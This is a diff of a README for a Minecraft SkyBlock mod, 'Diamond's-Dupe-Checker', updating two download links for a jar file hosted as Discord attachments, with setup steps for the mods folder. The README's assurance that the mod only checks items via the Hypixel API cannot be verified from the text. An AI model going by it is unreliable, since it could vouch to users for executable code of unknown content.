@@ -10,10 +10,10 @@ Once you activate the mod by installing it and joining SkyBlock, you need to act
 The simple answer to this question is No. All the mod does is check for duplicated items using the Hypixel API.
 
 # Download
-You can download the Diamond's-Dupe-Checker by clicking [here](https://cdn.discordapp.com/attachments/972894326592012332/975650957163655208/DDC-4.3.0.jar)
+You can download the Diamond's-Dupe-Checker by clicking [here](https://cdn.discordapp.com/attachments/972894326592012332/977678644849803334/DDC-4.3.2.jar)
 
 # How do I set it up?
-1. Download the mod by clicking [here](https://cdn.discordapp.com/attachments/972894326592012332/975650957163655208/DDC-4.3.0.jar)
+1. Download the mod by clicking [here](https://cdn.discordapp.com/attachments/972894326592012332/977678644849803334/DDC-4.3.2.jar)
 
 3. Go into the .minecraft and then the mods folder
 
